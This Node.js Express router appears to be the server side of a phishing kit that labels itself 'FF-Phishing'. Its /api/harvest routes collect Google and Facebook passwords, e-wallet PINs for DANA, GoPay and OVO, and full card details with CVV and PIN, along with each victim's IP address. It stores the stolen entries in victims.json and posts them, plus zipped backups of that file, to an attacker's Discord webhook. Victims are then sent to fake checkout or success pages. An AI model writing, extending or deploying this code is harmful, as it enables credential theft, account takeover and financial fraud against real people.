const express = require('express');
const router = express.Router();
const fs = require('fs-extra');
const axios = require('axios');
const path = require('path');
const AdmZip = require('adm-zip');
const FormData = require('form-data');

// Get webhook URL from file
function getWebhookURL() {
  try {
    const fileName = process.env.WEBHOOK_FILE || 'webhook.txt';
    const webhookPath = path.join(__dirname, '..', fileName);
    const webhook = fs.readFileSync(webhookPath, 'utf8').trim();
    return webhook;
  } catch (err) {
    console.error('❌ Error reading webhook file:', err.message);
    return null;
  }
}

// Send to webhook
async function sendToWebhook(data) {
  const webhookURL = getWebhookURL();
  
  if (!webhookURL || !webhookURL.startsWith('http')) {
    console.log('⚠️  No valid webhook URL found');
    return;
  }

  try {
    const payload = {
      ...data,
      timestamp: new Date().toISOString(),
      source: 'FF-Phishing'
    };

    const response = await axios.post(webhookURL, payload, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    console.log('✅ Data sent to webhook successfully');
  } catch (err) {
    console.error('❌ Webhook error:', err.response?.data || err.message);
  }
}


// Send victims.json as ZIP to webhook
async function sendZipToWebhook() {
  const webhookURL = getWebhookURL();
  if (!webhookURL || !webhookURL.startsWith('http')) return;

  try {
    const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
    if (!(await fs.pathExists(dataPath))) return;

    // Create ZIP in memory
    const zip = new AdmZip();
    zip.addLocalFile(dataPath);
    const buffer = zip.toBuffer();

    const form = new FormData();
    form.append('content', '📦 **New Backup: victims.json updated!**');
    form.append('file', buffer, { filename: 'victims_backup.zip' });

    await axios.post(webhookURL, form, {
      headers: { ...form.getHeaders() }
    });

    console.log('✅ ZIP backup sent to Discord');
  } catch (err) {
    console.error('❌ Failed to send ZIP to Discord:', err.response?.data || err.message);
  }
}

// Save to local JSON (Disabled on Vercel as disk is read-only)
async function saveToLocal(data) {
  if (process.env.VERCEL) {
    console.log('ℹ️ Running on Vercel, skipping local file save.');
    return;
  }

  const dataPath = path.join(__dirname, '..', 'data', 'victims.json');
  
  try {
    let victims = [];
    if (await fs.pathExists(dataPath)) {
      victims = await fs.readJson(dataPath).catch(() => []);
    }

    victims.push({
      ...data,
      timestamp: new Date().toISOString()
    });

    await fs.ensureDir(path.join(__dirname, '..', 'data'));
    await fs.writeJson(dataPath, victims, { spaces: 2 });
    console.log('✅ Data saved to victims.json');

    // Trigger ZIP backup
    await sendZipToWebhook();
  } catch (err) {
    console.error('⚠️ Skipping local save:', err.message);
  }
}

// POST /api/harvest/google
router.post('/harvest/google', async (req, res) => {
  const { email, password, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'google',
    email,
    password,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/checkout?step=payment' });
});

// POST /api/harvest/facebook
router.post('/harvest/facebook', async (req, res) => {
  const { email, password, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'facebook',
    email,
    password,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/checkout?step=payment' });
});

// POST /api/harvest/dana
router.post('/harvest/dana', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'dana',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/gopay
router.post('/harvest/gopay', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'gopay',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/ovo
router.post('/harvest/ovo', async (req, res) => {
  const { identifier, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'ovo',
    identifier,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

// POST /api/harvest/card
router.post('/harvest/card', async (req, res) => {
  const { cardNumber, expiry, cvv, pin, playerId } = req.body;
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const data = {
    type: 'card',
    cardNumber,
    expiry,
    cvv,
    pin,
    playerId,
    ip
  };

  await Promise.all([
    sendToWebhook(data),
    saveToLocal(data)
  ]);

  res.json({ success: true, redirect: '/success' });
});

module.exports = router;
